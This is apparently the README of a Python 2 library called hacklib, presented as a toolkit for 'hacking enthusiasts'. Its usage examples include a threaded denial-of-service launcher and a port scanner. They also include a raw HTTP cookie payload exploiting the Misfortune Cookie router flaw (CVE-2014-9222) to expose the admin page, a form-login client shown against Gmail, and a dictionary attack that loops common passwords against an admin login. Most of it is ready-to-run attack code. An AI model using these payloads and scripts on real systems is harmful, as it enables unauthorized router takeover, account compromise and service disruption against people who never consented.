# hacklib
![MIT License](https://img.shields.io/github/license/mashape/apistatus.svg)
[![Python 2.6|2.7](https://img.shields.io/badge/python-2.6|2.7-yellow.svg)](https://www.python.org/)
##### Toolkit for hacking enthusiasts using Python.
hacklib is a Python module for hacking enthusiasts interested in network security. It is currently in active development.

#### Examples of Usage
-
Multi-threaded Denial of Service (DOS) Stress-Testing:
```python
import hacklib

dos = hacklib.DOSer()
# Create 50 threads to send GET requests for 30 seconds
dos.launch('127.0.0.1', duration=30, threads=50)
```
-
Port Scanning:
```python
from hacklib import *

ps = PortScanner()
ps.scan(getIP('yourwebsite.com'))
# By default scans the first 1024 ports. Use ps.scan(IP, port_range=(n1, n2), timeout=i) to change default

# After a scan, open ports are saved within ps for reference
if ps.portOpen(80):
    # Establish a TCP stream and sends a message
    send(getIP('yourwebsite.com'), 80, message='GET HTTP/1.1 \r\n')
```

Misfortune Cookie Exploit (CVE-2014-9222) using PortScanner:
```python
>>> import hacklib

# Discovery
>>> ps = hacklib.PortScanner()
>>> ps.scan('192.168.1.1', (80, 81))
Port 80:
HTTP/1.1 404 Not Found
Content-Type: text/html
Transfer-Encoding: chunked
Server: RomPager/4.07 UPnP/1.0
EXT:
# The banner for port 80 shows us that the server uses RomPager 4.07. This version is exploitable.

# Exploitation
>>> payload = '''GET /HTTP/1.1
Host: 192.168.1.1
User-Agent: googlebot
Accept: text/html, application/xhtml+xml, application/xml; q=09, */*; q=0.8
Accept-Language: en-US, en; q=0.5
Accept-Encoding: gzip, deflate
Cookie: C107351277=BBBBBBBBBBBBBBBBBBBB\x00''' + '\r\n\r\n'
>>> hacklib.send('192.168.1.1', 80, payload)
# The cookie replaced the firmware's memory allocation for web authentication with a null bye.
# The router's admin page is now fully accessible from any web browser.
```
-
Universal Login for almost all HTTP/HTTPS form-based logins and HTTP Basic Authentication logins:

```python
import hacklib

ac = hacklib.AuthClient()
# Logging into a gmail account
htmldata = ac.login('https://gmail.com', 'email', 'password')

# Returns HTML whether login works or not.
# If resulting URL is the same, assumes failure and returns False.
if htmldata and 'Inbox' in htmldata:
    print 'Login Success'

# For logins using HTTP Basic Auth, just check boolean:
#if htmldata:
#    print 'Login Success'
```
Simple Dictionary Attack using AuthClient:
```python
import hacklib

ac = hacklib.AuthClient()
# Get the top 100 most common passwords
passwords = hacklib.topPasswords(100)

for p in passwords:
    htmldata = ac.login('http://yourwebsite.com/login', 'admin', p)
    if htmldata and 'welcome' in htmldata.lower():
        print 'Password is', p
        break
```
-
FTP Authentication:
```python
import hacklib
ftp = hacklib.FTPAuth('127.0.0.1', 21)
try:
    ftp.login('username', 'password')
except:
    print 'Login failed.'
```
